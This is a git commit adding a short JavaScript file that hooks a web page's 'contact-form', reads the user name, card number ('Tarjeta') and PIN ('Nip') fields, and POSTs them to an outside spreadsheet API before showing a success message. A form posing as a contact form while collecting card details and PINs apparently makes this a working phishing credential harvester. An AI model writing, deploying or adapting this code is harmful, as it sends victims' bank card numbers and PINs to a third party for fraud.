b22f5a209ee074b37a6ae6cf436d824fd03db5bb
reporte-b <raulritaromo@outlook.com>
2024-07-22 13:19:51 -0600

    add files upload

---
+++ js/12bj.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/8e4fa3f2-8157-4d50-bda7-4e9500d75671', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Tarjeta": formulario.contraseña.value,
+            "Nip": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
